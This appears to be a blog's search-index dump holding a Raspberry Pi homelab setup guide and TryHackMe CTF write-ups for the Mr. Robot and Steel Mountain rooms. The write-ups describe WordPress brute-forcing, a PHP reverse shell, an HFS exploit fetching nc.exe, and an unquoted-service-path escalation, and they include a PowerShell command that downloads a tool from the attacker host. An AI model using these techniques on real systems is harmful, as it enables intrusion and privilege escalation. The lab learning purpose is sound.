https://www.proxmox.com/en/proxmox-backup-server &#8617; " }, { "title": "Configure a Raspberry Pi from scratch", "url": "/posts/configure-raspberry-pi-from-scratch/", "categories": "Homelab", "tags": "", "date": "2022-11-12 11:00:00 -0500", "snippet": "Earlier this year, I converted my old desktop into a Proxmox server (you’re probably wondering why I’m talking about Proxmox on a post discussing the Raspberry Pi but we’ll get there) in an effort ...", "content": "Earlier this year, I converted my old desktop into a Proxmox server (you’re probably wondering why I’m talking about Proxmox on a post discussing the Raspberry Pi but we’ll get there) in an effort to offload the work of virtualizing VM’s on my devices. Whether it was a development VM or a Kali VM for my cybersecurity related activities, I was creating and managing VM’s on multiple devices. Setting up the Proxmox server resulted in a one-stop-shop for all of my VM’s and being able to remotely access them using Tailscale.Unfortunately, the old desktop I had was limiting in resources and the Proxmox instance was shutting down or rebooting several times in a day. Like the lazy technical engineer I am, I decided to buy a server off of EBay that a coworker recommended with greater resources and an Intel Xeon CPU (dedicated for servers?). Ideally, I would love to build a homelab with rack-mounted hardware but I am cheap at the moment so this will do. This post and subsequent posts will bringyou on my journey of setting up a homelab from scratch. The posts may not be in an order that make sense but we’ll start with configuring a Raspberry Pi.Raspberry PiWhy the Raspberry Pi? One, I had it lying around and thought I’d make use of it. Two, my coworker (the same one who recommended the EBay server) mentioned that he set up Proxmox Backup Server (PBS) as a Docker container on the Raspberry Pi. PBS is a storage option to backup VM’s from Proxmox Virtual Environment (PVE) nodes on a regular schedule and restore them onto any node. This is similar to VMWare or VirtualBox’s snapshot ability and being able to restore them but onsteroids. This also meant I could back up the VM’s from my old desktop hardware onto the newly purchased server hardware.In your case, you might want to install the Pi for any number of reasons. Potentially as a Minecraft server? Satisfactory server? Linux computer to practice your skills? The sky’s the limit. The steps here might be skewed towards my purpose but cherry pick whatever you think you’ll need. I’ll document how to configure the Raspberry Pi without any peripherals required other than your laptop as well as: networking authentication (password and SSH keys) docker mounting an external storage deviceWith that, let’s get started.Raspberry Pi ImagerThe Raspberry Pi foundation developed the Raspbery Pi Imager software 1, a fantastic tool to quickly install and flash the OS onto an SD card as well as configure the networking. Now, no longer shall we need peripherals to access the Raspberry Pi. So long as you have an SSH client like Putty (Windows) or the native client on Linux and Unix devices, you’re golden.Download the Imager. I’ll be performing the following steps from a macOS computer but the steps should be similar.Insert your SD card and launch the RPi imager software.Select the OS that you’d like to install.For myself, I’m going to install the Raspberry Pi OS (64-bit) option. I made this mistake in a prior build but if you’re going to install 64-bit software, select the 64-bit OS option. I banged my head for hours trying to deploy PBS (64-bit software on 32-bit OS).Next, select the SD card as the storage option to write the OS to.Click on the gear icon for advanced options where we’ll configure the hostname, SSH configuration, and networking. I’m not sure on other OS’s but when you open the advanced options on Mac, you may be prompted to pre-fill the Wi-Fi password from your Keychain. Hit yes if you’d like.For the advanced menu options: hostname: set your hostname but write it down as you’ll need it to connect to the Pi without knowing the IP address. The Raspberry Pi OS comes preinstalled with Avahi which enables multicast DNS lookup SSH: enable SSH and select one of the two options. If you don’t have public keys configured on your host, use password authentication and I will demonstrate closer to the bottom of the post how to generate SSH keys Username and Password: configure the username and password for the Pi (if you select password authentication for SSH, you’ll need this) Wireless LAN: your Wi-Fi SSID and passwordThe rest of the options aren’t important but feel free to fill them in. Hit Save and Write.A prompt will appear warning you that the storage device will be overwritten. If you’re sure you selected the correct device, wipe it!This will take a few minutes to write to the SD card but once it’s completed, we can insert the SD card into the Raspberry Pi and the device will appear on the network after a few minutes.SSH with your username@hostname and your password if you selected password authentication.robinder@Robins-Mac-mini ~ % ssh robinder@pi.localThe authenticity of host 'pi.local (2607:fea8:bde0:850::71c4)' can't be established.ED25519 key fingerprint is SHA256:XpsYdI05dOdxBEsDVYfAA99GN/mRdT5+JrGb9P5f4ko.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'pi.local' (ED25519) to the list of known hosts.Linux pi 5.15.61-v8+ #1579 SMP PREEMPT Fri Aug 26 11:16:44 BST 2022 aarch64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Thu Sep 22 04:17:48 2022robinder@pi:~ $Configuring your PiThe first thing to do is update the repositories and upgrade our packages.Due to my previous shenanigans with my homelab, I pushed DNS servers for hosts that don’t exist. If you face this issue, you can manually update the DNS servers in your /etc/resolv.conf file. This configuration file is overwritten by the resolvctl service on reboots so I’ll also document how to configure DNS servers when we set a static IP for the Pi.Original configuration:robinder@pi:~ $ cat /etc/resolv.conf# Generated by resolvconfdomain ht.homenameserver ::1Updated configuration:robinder@pi:~ $ cat /etc/resolv.conf# Generated by resolvconfdomain ht.homenameserver 8.8.8.8Now, we can finally perform our apt-get update and apt-get upgrade.robinder@pi:~ $ sudo apt-get updateGet:1 http://security.debian.org/debian-security bullseye-security InRelease [48.4 kB]Hit:2 http://deb.debian.org/debian bullseye InReleaseGet:3 http://deb.debian.org/debian bullseye-updates InRelease [44.1 kB]Get:4 http://archive.raspberrypi.org/debian bullseye InRelease [23.6 kB]Get:5 http://security.debian.org/debian-security bullseye-security/main armhf Packages [192 kB]Get:6 http://security.debian.org/debian-security bullseye-security/main arm64 Packages [192 kB]Get:7 http://security.debian.org/debian-security bullseye-security/main Translation-en [123 kB]Get:8 http://deb.debian.org/debian bullseye-updates/main armhf Packages [12.0 kB]Get:9 http://deb.debian.org/debian bullseye-updates/main arm64 Packages [12.0 kB]Get:10 http://deb.debian.org/debian bullseye-updates/main Translation-en [7,929 B]Get:11 http://archive.raspberrypi.org/debian bullseye/main arm64 Packages [299 kB]Get:12 http://archive.raspberrypi.org/debian bullseye/main armhf Packages [308 kB]Fetched 1,261 kB in 2s (649 kB/s)Reading package lists... Donerobinder@pi:~ $ sudo apt-get upgradeReading package lists... DoneBuilding dependency tree... DoneReading state information... DoneCalculating upgrade... DoneThe following package was automatically installed and is no longer required: libfuse2--------------- TRIMMED OUTPUT -----------------Install the tools that you’d like! In my case, VIM!Static IPThis section is optional but I prefer to manage the IP addresses for my devices on the network. I would especially prefer to maintain a DHCP/DNS server but that is going to be future Robin’s problem.To set a static IP address, we need four pieces of information: interface: usually eth0 if connected through ethernet or wlan0 if connected through Wi-Fi router’s IP: usually your subnet with an octet ending in .1 DNS server(s) to use desired static IP addressOpen /etc/dhcpcd.conf with your editor of choicerobinder@pi:~ $ sudo vim /etc/dhcpcd.confAppend the following lines and substitute the parametersinterface [INTERFACE]static ip_address=[IP ADDRESS]/24static routers=[ROUTER IP]static domain_name_servers=[DNS Servers]If the file contains uncommented lines related to a static IP configuration, remove them.For my configuration, the added lines look like this.interface wlan0static ip_address=192.168.0.26/24static routers=192.168.0.1static domain_name_servers=8.8.8.8Now reboot the Pi for the changes to persist.robinder@pi:~ $ sudo rebootUnclear why but my Pi didn’t reboot and remained in the off state. I had remove and plug in the power cable for it to power back on.After SSHing back onto the Pi, verify the IP address for the interface.robinder@pi:~ $ ip --brief alo UNKNOWN 127.0.0.1/8 ::1/128eth0 DOWNwlan0 UP 192.168.0.26/24 2607:fea8:bde0:850::71c4/128Great! If we exit from the SSH session and connect over the IP address, we should connect in the same fashion as we SSH’d via the hostname.robinder@Robins-Mac-mini ~ % ssh robinder@192.168.0.26The authenticity of host '192.168.0.26 (192.168.0.26)' can't be established.ED25519 key fingerprint is SHA256:XpsYdI05dOdxBEsDVYfAA99GN/mRdT5+JrGb9P5f4ko.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:1: pi.localAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.0.26' (ED25519) to the list of known hosts.Linux pi 5.15.76-v8+ #1597 SMP PREEMPT Fri Nov 4 12:16:41 GMT 2022 aarch64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Nov 11 16:49:47 2022 from 192.168.0.68As I verified the IP address, I noticed that /etc/resolv.conf did not update with the DNS servers I specified in the dhcpcd.conf file. Listing out the configuration that resolvctf was reading sudo resolvconf -l, the contents of resolv.conf was from the wlan0.dhcp6 interface but the configuration I specified in dhcpcd.conf was listed in the wlan0.dhcp interface. After some trial and error, I disabled ipv6 which fixed the issue.To disable IPv6, add the following lines to /etc/sysctl.conf. At this point, you are modifying kernel variables so tread carefully.net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1net.ipv6.conf.lo.disable_ipv6 = 1Executerobinder@pi:~ $ sudo sysctl -pwhich should list the lines you added to sysctl.conf. Now if you executerobinder@pi:~ $ sudo cat /proc/sys/net/ipv6/conf/all/disable_ipv61Reboot the Pi again and verify the DNS servers in /etc/resolv.conf.robinder@pi:~ $ cat /etc/resolv.conf# Generated by resolvconfnameserver 8.8.8.8Finally! And now we can move on from configuring our IP address.DockerInstalling Docker is incredibly simple thanks a Bash script that will install all of the requirements for us.robinder@pi:~ $ curl -sSL https://get.docker.com | shAfter the script has executed, we need to add the Pi user to the Docker group. Without this, the Pi user can’t execute docker comands.Our current groups does not contain dockerrobinder@pi:~ $ groups | grep -o dockerrobinder@pi:~ $Add the user to the grouprobinder@pi:~ $ sudo usermod -aG docker robinderLogout for the changes to take effectrobinder@pi:~ $ logoutConnection to pi.local closed.Checking the groups againrobinder@pi:~ $ groups | grep -o dockerdockerWe should be able to run docker commands without being root. Docker provides a hello-world repository to verify if your docker installation functioned.robinder@pi:~ $ docker run hello-worldUnable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world7050e35b49f5: Pull completeDigest: sha256:faa03e786c97f07ef34423fccceeec2398ec8a5759259f94d99078f264e9d7afStatus: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.Listing out all stopped and running containersrobinder@pi:~ $ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa6809696ef10 hello-world \"/hello\" About a minute ago Exited (0) About a minute ago zealous_lehmannRemove the exited containerrobinder@pi:~ $ docker rm zealous_lehmannzealous_lehmannRemove the hello-world imagerobinder@pi:~ $ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest 46331d942d63 7 months ago 9.14kBrobinder@pi:~ $ docker image rm hello-worldUntagged: hello-world:latestUntagged: hello-world@sha256:faa03e786c97f07ef34423fccceeec2398ec8a5759259f94d99078f264e9d7afDeleted: sha256:46331d942d6350436f64e614d75725f6de3bb5c63e266e236e04389820a234c4Deleted: sha256:efb53921da3394806160641b72a2cbd34ca1a9a8345ac670a85a04ad3d0e3507Attaching an External Storage DeviceOnce again, this section is optional.If the external storage device is not plugged in, attach it now and use the lsblk command to identify the device name.robinder@pi:~ $ lsblk -fNAME FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTsda└─sda1 ext4 1.0 b4881f35-5b06-47b4-842c-df9ee8c82b43 3.4T 1% /media/robinder/b4881f35-5b06-47b4-842c-df9ee8c82b43mmcblk0├─mmcblk0p1 vfat FAT32 boot 3772-58CD 223.2M 12% /boot└─mmcblk0p2 ext4 1.0 rootfs ee7f279a-1fe9-4c98-9f3c-83c7173683b7 23.9G 13% /The device I attached is located at /dev/sda1 and it has been automounted to /media but we can modify this. The mmcblk0 device is the SD card with the flashed Pi OS. Keep in mind, these ID’s may be different for you.Another way to view the devices attached to your Pi is with the blkid commandrobinder@pi:~ $ blkid/dev/mmcblk0p1: LABEL_FATBOOT=\"boot\" LABEL=\"boot\" UUID=\"3772-58CD\" BLOCK_SIZE=\"512\" TYPE=\"vfat\" PARTUUID=\"be42dfe6-01\"/dev/mmcblk0p2: LABEL=\"rootfs\" UUID=\"ee7f279a-1fe9-4c98-9f3c-83c7173683b7\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"be42dfe6-02\"/dev/sda1: UUID=\"b4881f35-5b06-47b4-842c-df9ee8c82b43\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"8189959c-d280-4a40-9d4a-6334d64319de\"Since my storage device has been automounted, I need to unmount it first.robinder@pi:~ $ sudo umount /media/robinder/b4881f35-5b06-47b4-842c-df9ee8c82b43Using the lsblk command againrobinder@pi:~ $ lsblk -fNAME FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTsda└─sda1 ext4 1.0 b4881f35-5b06-47b4-842c-df9ee8c82b43mmcblk0├─mmcblk0p1 vfat FAT32 boot 3772-58CD 223.2M 12% /boot└─mmcblk0p2 ext4 1.0 rootfs ee7f279a-1fe9-4c98-9f3c-83c7173683b7 23.9G 13% /There’s no mountpoint for /dev/sda1. Before specifying a mountpoint for the storage device, make a directory for where you want to mount it.robinder@pi:~ $ sudo mkdir /mnt/externalhddMount the storage device thererobinder@pi:~ $ sudo mount /dev/sda1 /mnt/externalhddThere’s no output but if you have files on the storage device previously, list the contents of the directory to verify that it mounted correctly.lsblk once againrobinder@pi:~ $ lsblk -fNAME FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTsda└─sda1 ext4 1.0 b4881f35-5b06-47b4-842c-df9ee8c82b43 3.4T 1% /mnt/externalhddmmcblk0├─mmcblk0p1 vfat FAT32 boot 3772-58CD 223.2M 12% /boot└─mmcblk0p2 ext4 1.0 rootfs ee7f279a-1fe9-4c98-9f3c-83c7173683b7 23.9G 13% /Manually mounting the device will not persist across reboots unless we add it to the /etc/fstab file.The format of the fstab file is:&lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;These columns represent 2: Filesystem : you can either specify a UUID (for universal unique identifier), a label (if you chose a label for your disk), a network ID or a device name (which is not recommended at all); Mountpoint : the directory on the filesystem that you are going to use in order to access data stored on the disk; Filesystem type : the type of filesystem you use to format your disk; Options : some options that you can specify in order to tune your mount (“ro” for a read-only mount or “noexec” to prevent binary execution); Dump : in order to enable to disable filesystem dumping on the system (using the dump command); Pass Num : sets the order used in order for the “fsck” utility to check your filesystem. If you are not mounting the root device, you should set this option to “2” or “0” as “1” is reserved for the root device.For myself, the entry in the fstab file look likerobinder@pi:~ $ tail -1 /etc/fstabUUID=b4881f35-5b06-47b4-842c-df9ee8c82b43 /mnt/externalhdd ext4 defaults 0 2The UUID is obtained from the output of the lsblk or blkid command. The mountpoint is where to mount the device, and the type is an ext4 filesystem that I found from the output of the lsblk/blkid commands. The remaining options I set as defaults.Close and save the file. If we reboot the system, our device should be mounted to our specified mountpoint.robinder@pi:~ $ lsblk -fNAME FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTsda└─sda1 ext4 1.0 b4881f35-5b06-47b4-842c-df9ee8c82b43 3.4T 1% /mnt/externalhddmmcblk0├─mmcblk0p1 vfat FAT32 boot 3772-58CD 223.2M 12% /boot└─mmcblk0p2 ext4 1.0 rootfs ee7f279a-1fe9-4c98-9f3c-83c7173683b7 23.9G 13% /SSH Key authenticationSSH keys are more secure than password based authentication and more convenient. If you don’t have an SSH key configured on your Mac or Linux system, then continue on. I apologize in advance if you use Windows.The previous sections of the article, I used my Mac Mini to write the Raspberry Pi OS to the SD card and the SSH key I added originally was from the Mac Mini. The following section describing how to generate the SSH key will float between my Macbook and the Raspberry Pi.When configuring the SD card, if you did not use public key authentication or even if you did but want to add additional keys, generate the key-pair using ssh-keygen.If using the default options for the command, just press until complete or provide values for the options.robinder@macbook ~ % ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/Users/robinder/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /Users/robinder/.ssh/id_rsaYour public key has been saved in /Users/robinder/.ssh/id_rsa.pubUse the ssh-copy-id command to copy the public key file to the Raspberry Pi user.robinder@macbook ~ % ssh-copy-id -i ~/.ssh/id_rsa.pub robinder@pi.local/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: \"/Users/robinder/.ssh/id_rsa.pub\"The authenticity of host 'pi.local (192.168.0.26)' can't be established.ED25519 key fingerprint is SHA256:XpsYdI05dOdxBEsDVYfAA99GN/mRdT5+JrGb9P5f4ko.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yes/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysrobinder@pi.local: Permission denied (publickey).I potentially expected this error to occur for myself. If you specified public-key authentication, follow the steps on the Raspberry Pi and your host computer to solve this issue.On the Pi, execute the following command.robinder@pi:~ $ grep PasswordAuthentication /etc/ssh/sshd_configPasswordAuthentication noSince we specified public-key authentication and not password authentication in the first step to write the OS to the SD card, this will be set to no. When I tried to copy the public key from the Macbook to the Pi, the Pi switched to password authentication since no public/private key pair matched. With password authentication disabled, we can’t copy keys unless we enable password authentication or copy and paste it into the authorized_keys file.Change the value to yes and restart the SSHD service.robinder@pi:~ $ grep PasswordAuthentication /etc/ssh/sshd_configPasswordAuthentication yesrobinder@pi:~ $ sudo service sshd restartIf I run the command from the Macbook againrobinder@macbook ~ % ssh-copy-id -i ~/.ssh/id_rsa.pub robinder@pi.local/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: \"/Users/robinder/.ssh/id_rsa.pub\"/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysrobinder@pi.local's password:Number of key(s) added: 1Now try logging into the machine, with: \"ssh 'robinder@pi.local'\"and check to make sure that only the key(s) you wanted were added.If I SSH from the Macbook nowrobinder@macbook ~ % ssh robinder@pi.localLinux pi 5.15.76-v8+ #1597 SMP PREEMPT Fri Nov 4 12:16:41 GMT 2022 aarch64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Nov 11 18:06:52 2022 from 192.168.0.68robinder@pi:~ $Amazing! Disable the password authentication and restart the service if needed.BackupThe last thing I would recommend is to backup the SD card to your computer. This behaves as a very weak snapshotting system but better than nothing.First, shutdown the Pi.robinder@pi:~ $ sudo shutdown nowRemove the SD card and insert it into your computer. The following instructions will be completed on the Mac Mini so use the appropriate software on your system to copy byte for byte from an SD card.List the attached devicesrobinder@Robins-Mac-mini ~ % diskutil list/dev/disk4 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *31.9 GB disk4 1: Windows_FAT_32 ⁨boot⁩ 268.4 MB disk4s1 2: Linux ⁨⁩ 31.6 GB disk4s2I removed other devices from the list but the Pi boot partition is named as Windows_FAT_32 boot and has the name /dev/disk4. Your device names may be different.To copy the contents of the disk to a file, use the dd command.robinder@Robins-Mac-mini ~ % sudo dd if=/dev/disk4 of=./Backups/PI/20221111_piSDCardBackup.dmgThis will take some time as the entire 32 GB SD card is being written. Once it’s written, eject the SD card safely.If we wanted to restore the SD card from our back, use the following commands.robinder@Robins-Mac-mini ~ % diskutil unmountDisk /dev/disk4robinder@Robins-Mac-mini ~ % sudo dd if=./Backups/PI/20221111_piSDCardBackup.dmg of=/dev/disk4Eject the SD card safely and insert into the Pi to pick up from your last save.ConclusionThis was a long post but I shared my journey of addressing issues as I encountered them which many posts do not do.In future posts (hopefully shorter), I will document the steps to configure other software for the Pi or other parts of my home lab. At the end of this post, you should have a functioning Pi that is ready for any tasks you assign it.References https://www.raspberrypi.com/software/ &#8617; https://devconnected.com/how-to-mount-and-unmount-drives-on-linux/ &#8617; " }, { "title": "Mr. Robot (Try Hack Me)", "url": "/posts/thm-mrrobot/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-20 21:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: Mr. RobotDescription: Based on the Mr. Robot show, can you root this box?Free/Subscriber: FreeDifficulty: MediumEnumerationFrom the information in the nmap scan results, it is not clear on this target’s OS.There are 2 open ports and 1 closed port: 80 (HTTP) 443 (HTTPS)Briefly checking the web applications served on port 80 and 443, they seem to be the same web application which makes our life easier.HTTPLet’s first browse to the web application before performing any automated scanning.The web application is interactive and displays a scrolling page of text imitating the bootup a Linux device.Interacting with some of the options and investigating the Javascript source code which enables the interactivity, there was nothing we could utilize here.There is a robots.txt file.User-agent: *fsocity.dickey-1-of-3.txtLet’s download both files.$ wget http://10.10.255.152/key-1-of-3.txt$ wget http://10.10.255.152/fsocity.dicThe key-1-of-3.txt file is the first key we need to submit to the THM room. The second file contains a large list of words that may be useful as potential passwords but are also repeated quite a bit. Let’s filter out any words that are repeated.$ cat fsocity.dic | sort -u &gt; fsocity-filtered.dicThe file originally contained over 800,000 words but after filtering out the repeated words, there are just slightly over 11,000 words.Now, let’s kick off some directory enumeration scans using the common.txt SecLists file.This took awfully long despite using 25 threads (typically 10) and approximately 4000 entries in the common.txt file but we got more than enough results which required two separate images.The results confirm that the web application is serving a Wordpress CMS. This is indicative by the endpoints that are prefixed with the “wp-“. With such a large number of entries, it was overwhelming to know where to begin. Most did not lead to web pages that were accessible but checking the “/0” endpoint did lead to a page that looked similar to a typical Wordpress site.There is also a login page at /wp-login but we don’t have a potential username to brute force.WordPress EnumerationThere are several techniques to enumerate various aspects of WordPress such as the version information, plugins, users, and more 1. There is also the wpscan tool that can perform this enumeration for us but I didn’t find it as effective.Sometimes the WordPress version can be leaked in the HTML source as a meta tag. I didn’t find it in the index page or on the login page but was able to find it on the /0 endpoint.There weren’t any relevant public exploits that we could use for this specific version of WordPress.Next, let’s enumerate the WordPress users. This can be done by appending a ?author=1 to the end of the URL which should display the posts by that user if the user exists. If the user does exist, the title of the page should change to that specific user.Note: This also did not work on the index page but it did work on the /0 wordpress page.Cycling through ID’s 0 to 10, we discovered two potential users.The remaining ID’s displayed “user’s Blog” similar to the earlier image displaying the /0 endpoint.Wordpress also verifies the existence of the user through the login page.We can brute force elliot’s account using the fsocity-filtered.dic password list and hydra.Success! We have access to the web application as the user elliot.Initial FootholdWordPress Reverse ShellWith the Appearance editor, we are able to edit the 404.php file of the twentyfifteen theme to generate a reverse shell 2.First, let’s modify PentestMonkey’s PHP reverse shell with our attacker system’s IP address and port that netcat will be listening to catch the reverse shell. Copying the source code, we’ll update the 404.php code and initialize our netcat listener.Once we browse to the location of the 404.php file, we should see our Netcat listener catch the reverse shell as the daemon user.Let’s upgrade our shell and move onto privilege escalation.Privilege EscalationHorizontal Privilege EscalationChecking out /home, there is a home directory for the user, robot. Checking the list of files, we see the second key (key-2-of-3.txt) and a password.raw-md5 file.The password file is world readable and contains an MD5 hash. Let’s crack the hash using John the Ripper and the RockYou.txt wordlist.Success! Let’s switch into the robot user with the given credentials. We can now read the key-2-of-3.txt file and submit it to THM.Vertical Privilege EscalationRobot is not able to run sudo on this target so we’ll have to escalate our privileges another way. Let’s check for any interesting binaries with the SUID bit enabled.The nmap binary is not a typical SUID enabled binary which stood out. Checking GTFObins, I scrolled down to the bottom to the SUID section and was not able to abuse given the technique they outlined.The version of nmap installed on the system did not have the –script option enabled.Thinking that the nmap binary was a dead end, I noticed that there is a MySQL database running only accepting localhost connections. After spending lots of time searching through the filesystem for config files and not getting anywhere, I checked the hint for the 3rd and final key but the hint was nmap.After spending that time, I searched through GTFObins again to see if there was anything we could take advantage of.One of the first techniques outlined specified an exploitation technique for versions that the installed nmap version falls within. If only I had slowed down my pace..This is incredibly simple so let’s get a root shell and submit the final flag.ReflectionThis room was significantly more challenging and time consuming than the previous rooms I’ve completed. Even after completing it once before, it was challenging to complete the second time around.Realistically, the path to realizing that enumerating the users of the WordPress application is not as straightforward as it seems in the writeup above. It was a massive mish-mash of various techniques, exploit searching, further directory enumeration, and more. It’s tough to display all of the things I did to get to the correct killchain.Lessons Learned: Enumerating the WordPress application is key to understanding the available users. Nmap should not have been configured with the SUID bit enabled. On top of that, the version of nmap is significantly outdated. The robot user’s password file which allowed horizontal privilege escalation should not have been world-readable. Do not give up on a vector (i.e utilizing nmap to escalate privileges) until you’ve tried as much as what is possible Lastly, the robots.txt should not have leaked the path to the fsocity.dic file which enabled us the initial foothold to the WordPress panelReferences https://hackertarget.com/wordpress-user-enumeration/ &#8617; https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce &#8617; " }, { "title": "Steel Mountain (Try Hack Me)", "url": "/posts/thm-steelmountain/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-19 18:15:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: Steel MountainDescription: Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.Free/Subscriber: SubscriberDifficulty: EasyEnumerationFirst things first, let’s perform an nmap scan to understand more about the target and what services are available.There are a ton of available services! Listing them out: HTTP (80, 8080) NetBIOS/SMB (135, 139, 445) RDP (3389) RPC (49152, 49153, 49154, 49155, 49156, 49163)From the available services and the type of software being served (i.e IIS), we can say with 100% confidence that this is a Windows OS target.HTTP (port 80)The first web application that we’ll encounter is served by a Microsoft IIS 8.5 service. I’m fairly confident that the current version is 10.X so this is outdated.Before trying to exploit the specific version of IIS, let’s explore the web application a bit.The landing page is just an image of an employee at Steel Mountain. Viewing the page source, we know the employee’s name is Bill Harper as that is the name of the image.However, there is no other information leaked in the source code, no robots.txt file, and no hidden directories through directory enumeration.Let’s explore the web application being served at port 8080.HTTP (port 8080)This web application is being served by HttpFileServer http 2.3. This does not look like a typical Apache, nginx, IIS, etc service that we usually encounter.Clicking on the HttpFileServer 2.3 link at the bottom left, we’re redirected to the Rejetto vendor that provides the software.The product is an HTTP File Server which allows you to send and receive files over the network and it is a “right out of the box” product.Let’s see if there are any available exploits for this version of HFS.Initial FootholdMany entries in the exploitdb database related to a RCE vulnerability in this version of HFS. Let’s copy over the Python script (39161.py) to our local directory and understand the exploit.The script requires a bit of modification specifying the IP address of our attacker system as well as the port that the victim system will connect back to with a reverse shell.The payload will download the nc.exe binary from our attacker system. To pull off the above attack, we’ll need to: Download the nc.exe binary from https://github.com/int0x33/nc.exe/blob/master/nc64.exe Initialize a Python web server on port 80 to serve the netcat binary Initialize a netcat listener on port 8000 and update the script with this portExecuting the script providing the arguments for the target’s IP address and port, we receive our reverse shell!We have a shell to STEELMOUNTAIN as Bill! We can find his flag at C:\\Users\\bill\\Desktop\\bill.txt, submit this flag, and proceed to some privesc.Privilege EscalationPerforming some basic enumeration searching for files did not lead to anything.With very little experience with Windows exploitation or privilege escalation, I’ll resort to using the WIndows Privilege Escalation Script located in the PEASS-ng repository.Serving this file from our attacker system’s simple Python server, we’ll transfer it over to the attacker system using the following command:powershell -c \"curl http://10.6.5.103/winPEASx64.exe -OutFile winpeas.exe\"This command will save the file in the directory that the command was executed from. Running the privilege escalation script, one thing vaguely stands out from experience with Windows targets through HTB.This service is unquoted and contains a space. If we are able to write to that directory as Bill and start/stop the service, we could place a malicious payload to connect back to our attacker system.The way Windows service managers searches for the binary with a space in the path is that it’ll search for Advanced.exe when it encounters C:\\Program Files (x86)\\IObit\\Advanced and if it does not find Advanced.exe, it continues down the path.If we can inject a reverse shell payload generated by msfvenom as Advanced.exe, we can restart the AdvancedSystemCareService9 service and obtain SYSTEM privileges 1.Let’s generate the malicious payload using msfvenom.Now, we’ll need to configure a web server to transfer the Advanced.exe payload over to the target system.The location of where we save the Advanced.exe file is important. Since the path for the AdvancedSystemCareService9 service is unquoted and contains a space, the service manager will prioritize Advanced.exe over the “Advanced SystemCare” directory and choose that as the executable.All that’s left is to stop the AdvancedSystemCareService9 service and start it. Before we do that, let’s initialize a netcat listener on port 5555.Awesome! All we need to do is obtain the root flag at C:\\Users\\Administrator\\Desktop\\root.txt and submit the flag to complete this room.ReflectionI haven’t had much experience with Windows systems through THM so it makes me uncomfortable to try to navigate the CMD or Powershell terminal but this room was a great way to ease into the Windows environment.The privilege escalation was particularly interesting. It is an incredibly easy mistake to make as a system administrator and configure incorrectly. This room also provides the opportunity to use an exploit that is not incredibly difficult to modify to obtain that experience of manual exploitation (OSCP…).Once again, this is a fantastic room and unfortunately, it requires a Subscription to THM. However, I wholeheartedly recommend a subscription to this platform as there is fantastic content available here.Useful CommandsPowershell Curl FileExecute a powershell command from within CMD prompt to download a file from an attacker system.powershell -c \"curl http://10.6.5.103/winPEASx64.exe -OutFile winpeas.exe\"References https://pentestlab.blog/2017/03/09/unquoted-service-path/ &#8617; " }, { "title": "Lian Yu (Try Hack Me)", "url": "/posts/thm-lianyu/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-19 12:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: Lian YuDescription: Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have 